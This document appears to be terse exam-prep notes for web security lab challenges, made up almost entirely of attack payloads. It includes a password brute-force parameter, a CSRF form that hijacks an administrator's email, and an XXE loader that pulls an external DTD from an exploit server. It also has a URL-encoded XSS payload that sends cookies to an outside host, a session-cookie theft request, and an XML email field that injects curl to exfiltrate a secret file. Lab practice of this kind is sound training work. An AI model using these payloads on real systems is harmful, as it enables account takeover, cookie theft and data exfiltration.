# Extra 13  

## 1 - 1  
  
>Brute force forgot password valid user  

```
&username=$USER-LIST$&password=RandomIncorrect112233
```  
  
## 1 - 2  

>CSRF change email of administrator

```
<html> 
  <body>
<meta name="referrer" content="no-referrer">
    <form action="https://TARGET.net/my-account-details/changeemail" method="POST">
      <input type="hidden" name="email" value="administrator&#64;exploit&#45;SERVER&#46;exploit&#45;server&#46;net" />
      <input type="hidden" name="form&#45;id" value="abcdef" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```  


>deliver to victim  

## 1 - 3  

>admin User import XML file

```
https://exploit-server.net/exploit.dtd
```  

>upload xml  

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>CrazyUser</username>
        <email>CrazyUser@email.net</email>
    </user>    
</users>
```  
  
-----
  
## 2 - 1  
  
>reflected xss  

```
/resources/images/tracker.gif?searchTerms=fuzz
```  

>exploit server, deliver to victim  

```
<script>
location = "https://TARGET.net/?term=%3c%2f%53%63%52%69%50%74%20%3e%3c%69%6d%67%20%73%72%63%3d%61%20%6f%6e%65%72%72%6f%72%3d%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%7a%33%33%65%77%64%34%32%6a%73%67%73%6d%71%32%63%39%69%72%36%77%6b%71%33%32%75%38%6c%77%62%6b%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%62%69%73%3d%22%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3e"
</script>
```  

## 2 - 2  

>password refresh csrf + current user csrf token 

>request user cookie  

```
POST /forgot_password HTTP/2
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--z%z%z%z%3d

csrf=CurrentUserCookieValueX&username=administrator
```  

>IN response 200 ok GET the admin cookie value created  

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=%7b%22username%22%3a%22administrator%22%2c%22isloggedin%22%3atrue%7d--xx%xx%2blQ%3d%xx; Secure; SameSite=None
```  

>copy stolen cookie to session


## 2 - 3  

>admin function upload xml , OS command inject

```
------WebKitFormBoundary

Content-Disposition: form-data; name="user-import-file"; filename="exam13.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>user16</username>
        <email>user16@exploit-server.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
    </user>
</users>

------WebKitForm
```  
